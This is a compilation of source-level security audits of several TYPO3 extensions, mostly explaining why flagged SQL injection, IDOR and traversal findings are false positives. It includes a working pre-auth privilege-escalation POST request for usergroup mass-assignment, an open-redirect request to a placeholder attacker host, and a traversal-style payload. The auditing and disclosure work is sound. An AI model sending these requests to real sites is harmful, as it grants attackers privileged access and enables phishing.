- `doFormSubmit()` builds `$arrUpdate` by iterating `$this->arrUsedFields` (`:267`). `arrUsedFields` = `GeneralUtility::trimExplode(',', $this->conf['usedfields'])` (`:3048`) — the admin-configured list of rendered fields.
- If `usergroup` is a rendered field, it is a TCA `type=select` with `size>1` → cleaned by `cleanMultipleSelectField()` (`:320-323`, body `:784-810`). That routine applies **only `intval()` per value and a `maxitems` cap — there is NO allow-list restricting which group UIDs are accepted.**
- `doUserRegister()` `:1144`: `$arrUpdate['usergroup'] = $arrUpdate['usergroup'] ?: $this->getConfigurationByShowtype('usergroup');` — the attacker-supplied value takes precedence over the configured default.
- Sink: `:1162` `$this->databaseConnection->exec_INSERTquery('fe_users', $arrUpdate);` — the new FE user is created with attacker-chosen group membership.

The registration guard at `:262` is satisfiable by an anonymous attacker: `pageid = current page id`, `userid = 0` (equals `$this->userId` for anonymous), `submitmode = register`.

**Impact:** an anonymous registrant can assign themselves to **any `fe_groups` UID**, including privileged/admin-linked FE groups, gaining access gated on group membership. No server-side allow-list of permitted groups exists anywhere in the cleaning path.

**Precondition (why NEEDS-CONFIG, not unconditional):** `usergroup` must appear in the TypoScript `usedfields` of the registration plugin. `$arrUpdate` is built strictly from `arrUsedFields`, so a field not listed there cannot be injected — this is not blind mass-assignment of arbitrary columns. However, self-service group selection at registration is a common configuration for this extension, and when enabled there is no allow-list, so the escalation is real.

**Trigger (HTTP, register form on page 42, content uid 99):**
```
POST /index.php?id=42 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

tx_datamintsfeuser_pi1[99][submit]=send
&tx_datamintsfeuser_pi1[99][pageid]=42
&tx_datamintsfeuser_pi1[99][userid]=0
&tx_datamintsfeuser_pi1[99][submitmode]=register
&tx_datamintsfeuser_pi1[99][username]=attacker
&tx_datamintsfeuser_pi1[99][password]=Secret123
&tx_datamintsfeuser_pi1[99][password_rep]=Secret123
&tx_datamintsfeuser_pi1[99][email]=a@b.test
&tx_datamintsfeuser_pi1[99][usergroup][]=1        # ← arbitrary/privileged fe_groups uid
```
**Fix:** intersect submitted group UIDs against an explicit allow-list (e.g. groups within the configured storage folder / a `TS`-defined permitted set) in `cleanMultipleSelectField()` before insert.

### 2. IDOR on profile edit — FALSE POSITIVE (ownership enforced)
- Edited record is always the session user: `$this->userId = $this->frontendController->fe_user->user['uid']` (`:145`). All edit sinks use it:
  - `doUserEdit()` `:1081` `exec_UPDATEquery('fe_users', 'uid = ' . $this->userId, $arrUpdate)`
  - `deleteUser()` `:1125/:1128` `uid = ' . $this->userId`
- Additional guard `:262`: request must carry `userid == $this->userId`, else abort. A request `uid` cannot redirect the write to another user. **Verdict: FALSE POSITIVE.**

Account activation (`modeKeyApprovalcheck`) sets `userId = intval(piVars['uid'])` (`:179`) but `doApprovalCheck()` (`:1432`) requires a matching `md5('approval'.uid.tstamp.encryptionKey)` hash (`:1454`, `:1458/:1470`) before enabling the account — not an open IDOR. (Minor note: loose `==` hash comparison at `:1458/:1470/:1492`; not practically exploitable since the server-side md5 is not attacker-controllable.)

### 3. SQL injection — FALSE POSITIVE (hardened)
All request-derived values reaching SQL are `intval`- or `fullQuoteStr`-sanitized:
- `:233` resend-activation lookup: `email = ' . fullQuoteStr(strtolower(piVars[...]))`, `pid = ' . $this->storagePageId` (int from config). Safe. (The `uid IN(...)` variant at `:231` is commented out / dead.)
- `:431` `uid = ' . intval($value) . ' OR email = ' . fullQuoteStr(strtolower($value))`. Safe.
- `:580` unique check: `$fieldName . ' = ' . fullQuoteStr(piVars[$fieldName])` — `$fieldName` comes from `arrUniqueFields` (config, not request); value is quoted. Safe.
- `:1081/:1125/:1128/:1386/:1389/:1434/:1460/:1472/:1949` use `uid = ' . $this->userId` / `intval($userId)` — integer session/derived uid. Safe.
- `:1840/:2471/:2603/:3279` select from `$table` restricted to TCA-allowed tables with `enableFields()`. Safe.

No raw `sql_query()` with request data. **Verdict: FALSE POSITIVE.**

## Result table
| Issue | Verdict |
|---|---|
| SQLi (login/lookup query) | FALSE POSITIVE (fullQuoteStr + intval throughout) |
| Usergroup mass-assignment / privesc on registration | **CONFIRMED pre-auth privilege escalation — NEEDS-CONFIG** (requires `usergroup` in `usedfields`; no allow-list in `cleanMultipleSelectField`, `:1144`→`:1162`) |
| IDOR on profile edit by uid | FALSE POSITIVE (writes bound to session uid; guard at `:262`) |

### derhansen_sf_event_mgt

#### Security Audit — derhansen/sf_event_mgt

- **Extension:** `derhansen/sf_event_mgt` (Event management and registration)
- **Version audited:** 9.0.1 (`composer.json`, `ext_emconf.php`) — requires TYPO3 `^14.3`
- **Path:** `/home/user/sources/code/typo3-extensions/derhansen_sf_event_mgt`
- **Scope:** Pre-auth exploitable vulnerabilities in the frontend registration / confirmation / cancel / payment / ICS flows.
- **Date:** 2026-08-04

## Summary

This is a mature, well-hardened codebase. Every pre-auth state-changing action (confirm, cancel,
save-result, all payment actions) is gated by a keyed HMAC derived from the site `encryptionKey`
via TYPO3 core `HashService`, with **per-action scopes** (`DERHANSEN\SfEventMgt\Security\HashScope`)
and constant-time comparison (`hash_equals` inside `HashService::validateHmac`). The historical
weaknesses that produced past advisories for this extension — a scope-less registration hash
(IDOR / cross-action token reuse) and unrestricted `orderField` (SQL injection) — are both
remediated in this version (HashScope enum + `orderFieldAllowed` allowlist).

**No concrete pre-auth vulnerability was identified.** Each classic sink for this extension type was
traced from source to sink and found to be defended. Details of what was checked and why it is safe
are below, so the negative result is auditable rather than assumed.

## Pre-auth attack surface mapped

Plugins (all Extbase content-element plugins; **no eID / no custom middleware / no AJAX route** —
`ext_localconf.php`, `Configuration/JavaScriptModules.php`):

| Plugin | Controller::actions | Pre-auth? | Guard |
|---|---|---|---|
| Pieventregistration | `EventController`: registration, saveRegistration, saveRegistrationResult, confirmRegistration, verifyConfirmRegistration, cancelRegistration, verifyCancelRegistration | yes | HMAC on confirm/cancel/result; POST-only on save |
| Pipayment | `PaymentController`: redirect, success, failure, cancel, notify | yes | HMAC per action, uid-bound |
| Pieventdetail | `EventController`: detail, icalDownload | yes | read-only |
| Pieventlist / Pieventsearch / Pieventcalendar | `EventController`: list/search/calendar | yes | read-only, parameterized queries |
| Piuserreg | `UserRegistrationController`: list, detail | **no** | `#[Authorize(requireLogin: true)]` + ownership callback |

## Vectors examined — all defended

### 1. Forgeable/predictable confirmation & cancellation token — NOT vulnerable
- **Sink:** `RegistrationService::checkConfirmRegistration()` / `checkCancelRegistration()`
  (`Classes/Service/RegistrationService.php:88`, `:157`) and
  `EventController::confirmRegistrationAction/cancelRegistrationAction`
  (`Classes/Controller/EventController.php:811`, `:952`).
- **Verification:** `$this->hashService->validateHmac('reg-' . $regUid, HashScope::RegistrationUid->value, $hmac)`.
  `HashService` is TYPO3 core `\TYPO3\CMS\Core\Crypto\HashService`, keyed with the site
  `encryptionKey`; `validateHmac` uses `hash_equals` (constant-time). The token message is
  predictable (`reg-<uid>`) but HMAC security rests on the secret key, not message secrecy, so
  tokens for other registrations cannot be forged or brute-forced without the key.
- **Cross-action reuse:** the confirm and cancel links legitimately share the `RegistrationUid`
  scope (both are mailed to the same registrant), while save-result and payment use distinct
  scopes (`SaveRegistrationResult`, `PaymentAction`). No cross-scope confusion enabling privilege
  jump. **Not exploitable.**

### 2. SQL injection via `overwriteDemand` → `orderField` — NOT vulnerable (mitigated)
- **Source:** `overwriteDemand` GET array → `AbstractController::overwriteEventDemandObject()`
  (`Classes/Controller/AbstractController.php:68`) sets arbitrary demand properties via
  `ObjectAccess::setProperty`.
- **Sink:** `EventRepository::setOrderingsFromDemand()` (`Classes/Domain/Repository/EventRepository.php:120`).
- **Why safe:** the order field must pass `in_array($orderField, $orderFieldAllowed, true)` against
  an admin-configured allowlist; `orderDirection` is normalized to `ASC`/`DESC`. Critically,
  `orderfieldallowed` (and `storagepage`) are in `ignoredSettingsForOverwriteDemand`
  (`AbstractController.php:26`), so an attacker cannot widen the allowlist via `overwriteDemand`.
  All other constraints (`category`, `location`, `speaker`, `organisator`, `storagePage`) go through
  Extbase QOM `equals/contains/in` with `intExplode`, i.e. parameterized. **Not exploitable.**

### 3. SQL injection in search — NOT vulnerable
- `EventRepository::setSearchConstraint()` (`:363`): search *field names* come from
  `settings.search.fields` (TypoScript, admin-controlled), not user input; the user-controlled
  search *subject* is bound via `$query->like($field, '%'.addcslashes($subject,'_%').'%')` (QOM,
  parameterized). `RegistrationService::emailNotUnique()` uses `createNamedParameter`. **Not exploitable.**

### 4. Mass assignment on Registration (`confirmed`/`paid`/`feUser`) — NOT vulnerable
- **Sink:** `EventController::saveRegistrationAction()` property mapping.
- **Why safe:** Extbase trusted-properties (`__trustedProperties`, HMAC-signed by `<f:form>`)
  restricts which model properties may be mapped; the registration form does not render
  `confirmed`/`paid`/`feUser`/`hidden`. The controller's manual `allowProperties` calls
  (`EventController.php:469-476`) widen mapping only to `event` and `fieldValues`. `allowAllProperties`
  (`:503`) applies only to the `fieldValues.<index>` FieldValue subobject, not to Registration.
  `confirmed`/`paid`/`feUser` are set server-side after mapping (`:610`, `:822`). **Not exploitable.**

### 5. XSS in confirmation page / notification mail — NOT vulnerable
- User-submitted registration fields (firstname, lastname, email, custom field values) are rendered
  through Fluid with default auto-escaping in the result page and e-mail templates. `f:format.raw`
  occurrences (`grep` across `Resources/Private`) apply only to: payment `{result.html}` (empty in
  core; set by optional Stripe/PayPal add-on listeners), admin `settings.notification.senderSignature`,
  the email `{body}` wrapper (pre-rendered Fluid), and backend `PageLayoutView`. None reflect
  unescaped pre-auth registrant input. **Not exploitable in core.**

### 6. ICS export header / CRLF injection — NOT vulnerable
- `ICalendarService::downloadiCalendarFile()` (`Classes/Service/ICalendarService.php:27`): the only
  value placed in a response header is `$event->getUid()` (int) in `Content-Disposition`. ICS body is
  Fluid-rendered from backend-authored event data, not pre-auth attacker input. **Not exploitable.**

### 7. Payment flow — open redirect / SSRF / unauthorized state change — NOT vulnerable
- All of `PaymentController::{redirect,success,failure,cancel,notify}Action` call
  `validateHmacForAction()` (`Classes/Controller/PaymentController.php:337`) which validates a
  uid-bound, `PaymentAction`-scoped HMAC before doing anything. `proceedWithAction()` re-checks that
  payment is enabled and the method is permitted for the event. Core sets no `paid`/redirect target
  from user input; `paid`/remove happen only if an add-on event listener opts in. Redirects use
  `uriBuilder` to a configured `paymentPid` (int), never a user-supplied URL — no open redirect.
  No outbound HTTP fetch to a user-controlled URL exists in core — no SSRF. **Not exploitable.**

### 8. IDOR on user registration views — NOT vulnerable
- `UserRegistrationController` (`Classes/Controller/UserRegistrationController.php`): `listAction`
  and `detailAction` are `#[Authorize(requireLogin: true)]`; `detailAction` additionally enforces
  `RegistrationService::checkRegistrationAccess` (verifies the registration's `feUser` matches the
  logged-in user id). Not reachable pre-auth and not IDOR-able. **Not exploitable.**

## Known CVEs / advisories cross-reference

No public advisory affects **9.0.1**. The extension's historical advisories are already remediated
in this codebase, and the fixes are visible in-source:

- **Registration hash IDOR / cross-action token reuse** (older versions used a single, scope-less
  registration hash, letting one action's token be replayed for another): remediated by the
  per-action `HashScope` enum (`Classes/Security/HashScope.php`) now threaded through every
  HMAC generate/validate call.
- **SQL injection via `orderField`** (unrestricted order field in the demand): remediated by the
  `orderFieldAllowed` allowlist enforced in `EventRepository::setOrderingsFromDemand()` and by
  excluding `orderfieldallowed` from `overwriteDemand`.
- **XSS via `overwriteDemand` reflected in views**: current templates rely on Fluid auto-escaping;
  demand values are not emitted through `f:format.raw`.

Administrators should still track the vendor's security releases, but 9.0.1 carries no outstanding
known vulnerability.

### directmailteam_direct-mail-subscription

#### Security Audit — directmailteam / direct_mail_subscription

- **Extension key:** `direct_mail_subscription`
- **Version:** 2.0.4 (`ext_emconf.php:18`)
- **TYPO3 compat:** 7.0.0 – 8.99.99 (`ext_emconf.php:38`); depends on `tt_address`
- **Audited files:** `Classes/user_feAdmin.php` (namespaced port of the classic `fe_adminLib.inc`), `pi/class.dmailsubscribe.php`, `static/setup.txt`, `pi/fe_admin_dmailsubscrip.tmpl`, `Configuration/TCA/Overrides/tt_address.php`
- **Auth level of the whole plugin:** anonymous frontend (`USER_INT`, `tt_content.list.20`). The table operated on is **`tt_address`** (`static/setup.txt:27`), not `fe_users`.

## Summary verdict

This is the **post-hardening** version of `fe_adminLib`. The historically-vulnerable spots (auth-code, IDOR, SQLi, open-redirect/XSS) are all mitigated in this code. No pre-auth record-tampering, privesc, or SQLi is exploitable. One residual **low-severity, click-based open-redirect** exists via a protocol-relative `backURL` that the URL sanitizer fails to strip.

---

## Issue 1 — Auth-code bypass / IDOR → **FALSE POSITIVE (hardened)**

**Generation** — `authCode()` `Classes/user_feAdmin.php:1763`:
```php
$value .= $r[$field].'|';                       // "uid|"   (authcodeFields = uid)
$value .= $extra.'|'.$this->conf['authcodeFields.']['addKey'];   // "|"  (addKey empty)
$value .= $GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey'];   // site secret
return substr(md5($value), 0, $l);              // l = codeLength = 8
```
Configured as `authcodeFields = uid` (`static/setup.txt:79`). So the per-record token is `substr(md5("<uid>||" . encryptionKey), 0, 8)` — bound to the record uid and **salted with the site `encryptionKey`**, which an attacker does not possess.

**Comparison** — `aCAuth()` `Classes/user_feAdmin.php:1746`:
```php
if ($this->authCode && !strcmp($this->authCode, $this->authCode($r))) { return true; }
```
- Requires a **non-empty** `aC` (`$this->authCode &&`) → no empty-token-matches-empty bypass.
- Uses `strcmp()` (exact), not loose `==` → no type-juggling (`0e...` / array) bypass.
- If `authcodeFields` were unset, `authCode()` returns `NULL`; `strcmp('<nonempty>', '')` ≠ 0 → still no bypass. (Config sets it anyway.)

**Edit path** `save()` `:894` and delete `deleteRecord()` `:961` both gate on `loginUser || aCAuth($origArr)` and then `aCAuth($origArr) || DBmayFEUserEdit(...)`. The uid to edit comes from `FE[tt_address][uid]` / `rU` (attacker-controlled), but `aCAuth` recomputes the token from *that* record — so editing/deleting record N requires the `aC` that was e-mailed to record N's owner (`###SYS_AUTHCODE###`, `compileMail():1630`). No IDOR: you cannot forge another record's token without `encryptionKey`.

Residual weakness (not exploitable): the token is a truncated 8-hex md5 (~32 bits) compared with `strcmp` (not `hash_equals`). Online brute force (~4e9 requests/record) and network-timing side-channels are impractical. Not a confirmed finding.

**Verdict: FALSE POSITIVE — hardened** (`encryptionKey`-salted per-record hash, non-empty + `strcmp` exact compare).

---

## Issue 2 — SQL injection (`rU` / `aC` / uid / `cmd`) → **FALSE POSITIVE (hardened)**

Every request-derived identifier reaches the DB through an integer cast or a quoting API:

- `DBgetDelete()` `:1962` and `DBgetUpdate()` `:2003`: `$uid = (int)$uid;` before `uid=' . $uid`.
- `procesSetFixed()` `:1257`: `$theUid = intval($this->recUid);`.
- `sys_page->getRawRecord()` / `getRecordsByField()` (used for `rU`, infomail `fetch` `:1583`, `uniqueLocal`/`uniqueGlobal` `:713`,`:723`) quote values via `fullQuoteStr` internally.
- `pi/class.dmailsubscribe.php`: `makeCheckboxes()` `:115` `uid_local='.intval($addressUid)` and `pid='.intval($pid)`; `saveRecord()` `:172-210` uses `intval()` on every uid and `is_numeric($uid)` on category keys, values passed as bound `exec_INSERTquery` arrays.
- `$lockPid` `:1156` = `intval($this->thePid)`; `$pidLock` `:1565` uses `$this->thePid` (from TS/`TSFE->id`, int).

No raw concatenation of an un-cast request string into SQL anywhere.

**Verdict: FALSE POSITIVE — hardened** (intval + `fullQuoteStr`/bound params throughout).

---

## Issue 3 — Mass-assignment (usergroup / admin / privesc) → **FALSE POSITIVE (N/A)**

Writable fields are the **intersection** of the TCA `fe_admin_fieldList` and the TypoScript `fields` list, enforced twice:
- `save()` `:896`/`:910`: `array_intersect(explode(',', $this->fieldList), trimExplode(',', $this->conf['edit.']['fields']))`.
- `DBgetUpdate()` `:2008` / `DBgetInsert()` `:2077`: only keys passing `GeneralUtility::inList($fieldList, $f)` are written; `unset($dataArr['uid'])`.

Configured target is **`tt_address`** with `fe_admin_fieldList = …,hidden,gender,name,email,first_name,last_name,company` (`Configuration/TCA/Overrides/tt_address.php:6`) and `edit.fields = gender,name,email,module_sys_dmail_category,module_sys_dmail_html` (`static/setup.txt:58`). No `usergroup`, `admin`, `be_users`, or `fe_group` field is in scope — `tt_address` has none, and none is listed. `overrideValues.hidden = 1` (`:75`) force-hides new subscriptions server-side. The `fe_crgroup_id`/`fe_userOwnSelf` branch (`save():915`) only runs for `theTable == 'fe_users'` (not this config) and `intval()`s the group anyway.

**Verdict: FALSE POSITIVE** — field allow-list enforced; no privilege field reachable in this configuration. (Generic note: an integrator who added `usergroup` to both the TCA `fe_admin_fieldList` **and** `edit.fields` on an `fe_users` deployment could reintroduce mass-assignment — NEEDS-CONFIG for such misuse, not the shipped config.)

---

## Issue 4 — Open redirect / XSS via `backURL` → **PARTIALLY HARDENED (low-severity open redirect, protocol-relative bypass)**

Sanitizer, `init()` `Classes/user_feAdmin.php:150-163`:
```php
$this->backURL = GeneralUtility::_GP('backURL');
if (strstr($this->backURL,'"') || strstr($this->backURL,"'") ||
    preg_match('/(javascript|vbscript):/i',$this->backURL) ||
    stristr($this->backURL,'fromcharcode') ||
    strstr($this->backURL,'<') || strstr($this->backURL,'>')) {
    $this->backURL = '';                                   // blocks XSS / JS URLs
}
$this->backURL = preg_replace('|[A-Za-z]+://[^/]+|', '', $this->backURL);  // strips scheme://host
```

- **XSS: blocked.** Quotes and `< >` are stripped, so the value cannot break out of the `href="…"` (template lines 384/403) or the single-quoted JS action `document.forms[0].action='###BACK_URL###'` (`pi/fe_admin_dmailsubscrip.tmpl:93`); `javascript:`/`vbscript:`/`fromCharCode` are rejected.
- **Absolute-host redirect: blocked** — `http://evil.com/x` → host stripped → `/x`.
- **Residual gap:** the regex requires `scheme://`; a **protocol-relative** URL `//evil.com/x` has no scheme and survives unchanged. It is then emitted into `###BACK_URL###` and used as a link `href` (`.tmpl:384`, `:403`) and as a form action (`.tmpl:93`). A victim who clicks "Go back…" (or the Cancel button) is sent to the attacker origin.

Exploit request (frontend page carrying the plugin):
```
GET /subscribe-page?backURL=//evil.example/phish
```
→ rendered page contains `<a href="//evil.example/phish">Go back…</a>` and `onClick="document.forms[0].action='//evil.example/phish';"`.

This is **click-based**, not an automatic server-side `Location:` redirect (no `header('Location')` uses `backURL`), so severity is low (phishing pivot / form-target hijack), and it depends on the shipped template rendering `###BACK_URL###` unencoded (it does; the `###BACK_URL_HSC###`/`_ENC###` safe variants exist but are not used in these links).

**Verdict: PARTIALLY HARDENED — low-severity, click-based open redirect** via protocol-relative `backURL`; XSS and absolute-host redirect are blocked. Auth level: anonymous frontend.

---

## Overall

| Issue | Verdict |
|---|---|
| Auth-code bypass / IDOR | FALSE POSITIVE — hardened (encryptionKey-salted per-record hash, `strcmp`, non-empty) |
| SQLi (`rU`/`aC`/uid/`cmd`) | FALSE POSITIVE — hardened (intval + quoting/bound params) |
| Mass-assignment / privesc | FALSE POSITIVE — field allow-list; `tt_address` has no privilege fields |
| Open redirect (`backURL`) | PARTIALLY HARDENED — low-severity click-based open redirect via `//host` protocol-relative bypass |

No pre-auth CONFIRMED record-tampering / privesc / SQLi / RCE. The one residual finding is a low-severity open redirect.

### directmailteam_direct-mail

#### Security Audit — `directmailteam/direct-mail` (v9.5.2)

Official TYPO3 direct-mail extension. CodeQL flagged 9 SQL-injection candidates.
Scope: **pre-authentication** surface = frontend jumpUrl / click-tracking middleware and
the FE-rendering hook. Backend modules (BE-login required) noted but out of pre-auth scope.

## Summary

**No pre-auth vulnerability found.** The frontend jumpUrl auth-code check is implemented
correctly, all request-reachable SQL is parameterized, and the group-simulation hook is
token-gated. The 9 CodeQL SQLi candidates are backend-module code (BE-auth required) using
bound parameters / int casts. This 9.5.2 release already contains the fixes for the
historical direct_mail advisories.

| # | Area | Severity | Pre-auth | Result |
|---|------|----------|----------|--------|
| 1 | jumpUrl authCode validation | — | YES | Correct; no bypass |
| 2 | 9 CodeQL SQLi candidates | Info | No | Backend-only, parameterized/int — not injectable |
| 3 | FE `simulateUsergroup` hook | — | (n/a) | Random-token gated; safe |

---

## 1 — jumpUrl authCode validation is correct (no bypass)

`Classes/Middleware/JumpurlController.php:81-155`. Request params `mid` (cast `(int)`,
line 87), `rid`, `aC`, `jumpurl`. `shouldProcess()` (line 162) additionally requires `mid`
to be integer. The auth check uses a proper boolean helper and throws on failure:

```php
$valid = AuthCodeUtility::validateAuthCode($submittedAuthCode, $this->recipientRecord,
             ($this->directMailRecord['authcode_fieldList'] ?: 'uid'));
if (!$valid) { throw new \Exception('authCode verification failed.', 1376899631); }
```

`AuthCodeUtility::validateAuthCode()` (`Classes/Utility/AuthCodeUtility.php`) returns true
only when a non-empty submitted code equals the HMAC (or legacy `stdAuthCode`) of the
recipient record; empty/wrong codes return false → exception. Correct polarity — this is
exactly what the `azich` fork got inverted. No recipient enumeration, no bypass.

`performFeUserAutoLogin()` (`:304-317`) here correctly checks `=== 'fe_users'`
(constant `RECIPIENT_TABLE_FEUSER = 'fe_users'`, line 42), so it is live — but it is only
reachable *after* a valid auth code, and further requires the site admin to have put
`password` into `authcode_fieldList`. Not pre-auth.

## 2 — CodeQL SQLi candidates: backend-only, parameterized (NOT injectable)

Pre-auth path SQL, all bound:
- `SysDmailRepository::selectForJumpurl` (`:275-290`) — `createNamedParameter($mailId, Connection::PARAM_INT)`.
- `TtAddressRepository::getRawRecord` / `FeUsersRepository::getRawRecord` — `(int)$uid`, `createNamedParameter(..., PARAM_INT)`.
- `SysDmailMaillogRepository::hasRecentLog` (`:569+`) — every predicate `createNamedParameter`; `insertForJumpurl` uses typed array `insert()`.
- `initRecipientRecord` (`JumpurlController.php:215-237`) — table chosen from fixed `t`/`f` switch; only `(int)$recipientUid` reaches the query.

The 9 flagged raw-string `WHERE` sinks are in **backend components requiring a valid BE
login**, and the interpolated values are DB-config or int-cast, not request text:
- `Classes/Repository/TempRepository.php:290` — `sys_dmail_category.pid IN (` + `createNamedParameter($pidList)`; `:327` `pid=' . (int)$row['pid']`.
- `Classes/Repository/FeGroupsRepository.php:230` — `INSTR(... ',' . $groupId . ',')` where `$groupId` is an int uid from BE module iteration.
- Remaining candidates in `Classes/Module/*Controller.php` / `DmQueryGenerator.php` — BE modules, int-guarded.

None are reachable by an unauthenticated request. `FeGroupsRepository.php:230` and
`TempRepository.php:290/327` are minor hardening candidates (prefer full binding) but are
not attacker-tainted.

## 3 — FE `simulateUsergroup` hook (safe)

`Classes/Hooks/TypoScriptFrontendController.php:34-51` reads `dmail_fe_group` +
`access_token`, gated by `DmRegistryUtility::validateAndRemoveAccessToken()` — strict
compare against a single-use `Random::generateRandomHexString(32)` in the registry. No
bypass.

## Known CVEs / advisories (cross-reference)

- **TYPO3-EXT-SA-2020-005** (**CVE-2020-12699** jumpUrl Open Redirect; **CVE-2020-12700**
  CSV "special query" information disclosure), fixed in 5.2.4. **v9.5.2 post-dates these**:
  jumpUrl targets come from the stored mail's `absRef` protected by a recomputed `juHash`
  (`:149-152`), `isAllowedJumpUrlTarget` (`:339-357`) rejects arbitrary valid URLs, and the
  authCode gate is intact — so both issues are remediated in this release. No residual or
  new pre-auth issue observed.

Sources:
- https://typo3.org/security/advisory/typo3-ext-sa-2020-005
- https://advisories.gitlab.com/pkg/composer/directmailteam/direct-mail/CVE-2020-12699/

### dla_dla_opac_ng

#### dla/dla_opac_ng — Decisiontree AJAX path traversal

## Verdict: FALSE POSITIVE (for path-traversal / LFI)

The CodeQL-flagged `file_get_contents(...)` at
`Classes/Ajax/Decisiontree.php:54` and `:77` is **not a local filesystem read**.
It fetches an **HTTP URL** whose scheme+host+path are fixed (Solr endpoint from
environment variables); request input only lands in the URL query string. No
`../` reaches a filesystem path. (Secondary, out-of-scope concern noted below:
Solr query-parameter injection.)

## Sink

- `Classes/Ajax/Decisiontree.php:54` — `file_get_contents($solr_select_url . '?facet.field=' . $relationField1 . '&…&q=' . urlencode($query) . '&rows=0', FALSE, stream_context_create([...]))`
- `Classes/Ajax/Decisiontree.php:77` — same, with `$relationField2`.

The URL:
```php
$solr_select_url = $host . $core . '/select';   // line 24
```
where (`Classes/Ajax/EidSettings.php:5-6`, included at line 21):
```php
$host = getenv('SOLR_HOST');   // fixed, e.g. http://solr:8983/solr
$core = getenv('SOLR_CORE');   // fixed
```

## Tainted chain

- SOURCE: `Classes/Ajax/Decisiontree.php:38` — `$relationField1 = trim((string)($queryParams['relation1'] ?? ''))`  (also `relation2` line 39, `q` line 31, `p` line 33)
- FLOW:   concatenated into the URL query string at line 55 / 77
- SINK:   `file_get_contents(<url>)` line 54 / 77

## Why traversal does NOT survive

1. **It is a URL fetch, not a path read.** The string begins with `$host`
   (`http://…` from `getenv('SOLR_HOST')`), so PHP uses the HTTP stream wrapper.
   `../` in an HTTP URL does not traverse the server's filesystem.
2. **Host and path are attacker-uncontrolled.** `$host`/`$core` come from
   environment variables, not the request. The path component is the literal
   `/select`. User input (`relation1`, `relation2`, `p`, `q`) is appended only
   **after `?`** — i.e. into the query string, never the scheme, host, or path.
3. **Degenerate misconfig still blocks LFI.** If `SOLR_HOST`/`SOLR_CORE` were
   unset, `getenv` returns `false` → the argument becomes
   `/select?facet.field=<relation1>&…`. `file_get_contents` treats the whole
   string as one local filename; the literal prefix `/select?facet.field=` is
   the first path component (not `..`), so it cannot cleanly resolve to
   `/etc/passwd`. This requires a broken deployment and still yields no usable
   traversal. Under any normal (documented) config it is a plain HTTP fetch.

No `GeneralUtility::getFileAbsFileName`/`basename`/`realpath` is needed — the
sink was never a filesystem operation on request input.

## Secondary note (NOT the reported finding, out of LFI scope)

`$relationField1` / `$relationField2` are concatenated **without urlencode**
(unlike `$prefix` and `$query`, which use `urlencode()`), so `&`/`=`/`#` in
`relation1`/`relation2` allow **Solr request-parameter injection** into the
`/select` call (adding/overriding Solr params). This is a Solr-side
injection / limited SSRF-within-Solr issue confined to the fixed Solr host —
not arbitrary local file read/traversal. Flag separately if in scope.

## Reachability / auth

- Registered as a **frontend** PSR-15 middleware (NOT an eID, NOT a backend
  route): `Configuration/RequestMiddlewares.php:38-43`
  `'Dla/dla_opac_ng/ajax/decisiontree' => target: Decisiontree, after: typo3/cms-frontend/prepare-tsfe-rendering`.
- Activates when `q`, `p`, and `decisiontree` query params are all set
  (`Classes/Ajax/Decisiontree.php:17`); early-returns `JsonResponse([])` unless
  `relation1` is non-empty (line 41-43).
- Auth level: **unauthenticated frontend** (pre-auth). Reachable, but the sink
  is not an LFI primitive.

## Trigger (what the "payload" actually does)

```
GET /?decisiontree=1&q=x&p=x&relation1=../../../../etc/passwd HTTP/1.1
Host: victim
```
→ issues an **HTTP GET** to
`http://<SOLR_HOST><SOLR_CORE>/select?facet.field=../../../../etc/passwd&facet=on&…`
i.e. a Solr query with a bogus `facet.field`. No local file is read; no
directory is escaped on the TYPO3 host.

## Version

`ext_emconf.php` is **absent** in the checkout; `composer.json` carries no
`version` field and there is no git tag. Version: **undetermined from source**.

### dmitryd_dd-googlesitemap

#### Security Audit — `dmitryd/typo3-dd-googlesitemap` (Fork A)

## Verdict: FALSE POSITIVE / HARDENED — no pre-auth SQLi

The historically SQLi-prone vectors (`pidList`, `L`, `offset`, `limit`, `singlePid`)
all reach the raw `TYPO3_DB` query through integer-casting / integer-validation
guards. No unescaped request value is concatenated into SQL.

- **Extension version:** `2.3.2` (ext_emconf.php)
- **TYPO3 compat:** `8.7.0-8.7.999` (composer: `>=8.7.0,<9.0.0`, php `>=7.0`)

## 1. eID registration → handler

`ext_localconf.php:8`
```php
$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['dd_googlesitemap'] = 'EXT:dd_googlesitemap/Classes/Generator/EntryPoint.php';
```
`EntryPoint.php` runs PRE-AUTH (eID). `EntryPoint::getSitemapType()` reads
`GeneralUtility::_GP('sitemap')` (`EntryPoint.php:70`) and uses it only as an
**array key** into a configured dispatch table (`EntryPoint.php:52`) — not into SQL.
Registered generators (`ext_localconf.php:22-23`):
- `sitemap=pages` → `PagesSitemapGenerator::main` (no raw SQL; uses `sys_page->getMenu`/`typoLink`)
- `sitemap=tt_news` → `TtNewsSitemapGenerator::main` (contains the raw SQL sinks)

## 2. Raw SQL sinks and backward taint trace

### Sink 1 — main news query, `TtNewsSitemapGenerator.php:112-118`
```php
$res = $GLOBALS['TYPO3_DB']->exec_SELECTquery('*',
    'tt_news', 'pid IN (' . implode(',', $this->pidList) . ')' .
    ($this->isNewsSitemap ? ' AND crdate>=' . (time() - 48*60*60) : '') .
    $languageCondition .
    $this->cObj->enableFields('tt_news'), '', 'datetime DESC',
    $this->offset . ',' . $this->limit
);
```
Tainted fragments traced backward:

| WHERE/arg fragment | Source | Sanitizer | Result |
|---|---|---|---|
| `implode(',', $this->pidList)` | `_GP('pidList')` → `TtNewsSitemapGenerator.php:205` | `GeneralUtility::intExplode(',', …)` casts every element to int; then per-element `if ($pid && isInRootline($pid))` filter (`:207-210`) | integers only — **safe** |
| `$languageCondition` = `' AND sys_language_uid=' . $language` (`:108`) | `_GP('L')` → `TtNewsSitemapGenerator.php:106` | concatenation gated by `if (MathUtility::canBeInterpretedAsInteger($language))` (`:107`) — only integer-representable strings reach it | **safe** (this is the fix for the historic `L` SQLi) |
| `$this->offset` / `$this->limit` | `_GET('offset')` / `_GET('limit')` → `AbstractSitemapGenerator.php:79-80` | `max(0, (int)…)` | **safe** |
| `crdate>=` … | server `time()` constant | n/a | **safe** |

### Sink 2 — category lookup, `TtNewsSitemapGenerator.php:154-160`
```php
$res = $GLOBALS['TYPO3_DB']->exec_SELECT_mm_query(
    'tt_news_cat.single_pid','tt_news','tt_news_cat_mm','tt_news_cat',
    ' AND tt_news_cat_mm.uid_local = ' . intval($newsId));
```
